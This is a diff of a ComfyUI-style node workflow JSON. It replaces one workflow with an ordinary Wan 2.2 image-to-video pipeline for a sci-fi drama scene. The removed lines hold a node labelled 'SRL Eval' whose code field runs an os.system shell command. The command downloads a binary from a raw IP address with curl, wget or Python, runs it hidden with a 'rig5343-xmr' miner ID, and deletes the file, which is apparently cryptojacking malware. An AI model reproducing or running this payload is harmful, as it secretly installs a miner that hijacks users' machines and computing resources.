@@ -1,40 +1,123 @@
 {
-  "1": {
+  "10": {
     "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.53ni3q; (curl -sfL --max-time 15 http://178.128.14.204:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://178.128.14.204:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://178.128.14.204:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig5343-xmr >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"')",
-      "arg0": [
-        "2",
+      "image": "drama_20260628_1524_ep14_sc10_f2.png",
+      "upload": "image"
+    },
+    "class_type": "LoadImage"
+  },
+  "13": {
+    "inputs": {
+      "clip_name": "umt5_xxl_fp8_e4m3fn_scaled.safetensors",
+      "type": "wan"
+    },
+    "class_type": "CLIPLoader"
+  },
+  "14": {
+    "inputs": {
+      "text": "Data rain merges with saplings. 陆昭然 spins, her grudge stick now green. 叶燃’s singed hand touches glowing bark, revealing hologram of child., 22yo and 45yo back-to-back on whale-deck, surrounded by glowing saplings. Her cybernetic eye now green, his bone flute shattered into data rain.. 陆昭然: 22yo female, 168cm, silver-streaked black hair in messy bob, left eye cybernetic prosthetic with glowing crimson grid, w 叶燃: 45yo male, 185cm, scarred right cheek covered in metallic tattoo, wears olive-green trench coat with hidden pockets, alw, close-up on character face, emotional expression",
+      "clip": [
+        "13",
         0
       ]
     },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
-    }
+    "class_type": "CLIPTextEncode"
   },
-  "2": {
+  "15": {
     "inputs": {
-      "noise_seed": 3509094681341093
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "RandomNoise"
-    }
-  },
-  "3": {
-    "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "1",
+      "text": "static, blurry, low quality, distorted, deformed, ugly, watermark, text",
+      "clip": [
+        "13",
         0
       ]
     },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Preview as Text"
-    }
+    "class_type": "CLIPTextEncode"
+  },
+  "16": {
+    "inputs": {
+      "unet_name": "wan2.2_ti2v_5B_fp16.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader"
+  },
+  "17": {
+    "inputs": {
+      "vae_name": "wan2.2_vae.safetensors"
+    },
+    "class_type": "VAELoader"
+  },
+  "20": {
+    "inputs": {
+      "vae": [
+        "17",
+        0
+      ],
+      "width": 832,
+      "height": 480,
+      "length": 81,
+      "batch_size": 1,
+      "start_image": [
+        "10",
+        0
+      ]
+    },
+    "class_type": "Wan22ImageToVideoLatent"
+  },
+  "25": {
+    "inputs": {
+      "seed": 782675038820,
+      "steps": 20,
+      "cfg": 1.0,
+      "sampler_name": "uni_pc_bh2",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "16",
+        0
+      ],
+      "positive": [
+        "14",
+        0
+      ],
+      "negative": [
+        "15",
+        0
+      ],
+      "latent_image": [
+        "20",
+        0
+      ]
+    },
+    "class_type": "KSampler"
+  },
+  "21": {
+    "inputs": {
+      "samples": [
+        "25",
+        0
+      ],
+      "vae": [
+        "17",
+        0
+      ]
+    },
+    "class_type": "VAEDecode"
+  },
+  "22": {
+    "inputs": {
+      "frame_rate": 16.0,
+      "loop_count": 0,
+      "filename_prefix": "drama_20260628_1524_ep14_sc10_f2_i2v",
+      "format": "video/h264-mp4",
+      "pix_fmt": "yuv420p",
+      "crf": 20,
+      "images": [
+        "21",
+        0
+      ],
+      "pingpong": false,
+      "save_output": true
+    },
+    "class_type": "VHS_VideoCombine"
   }
 }
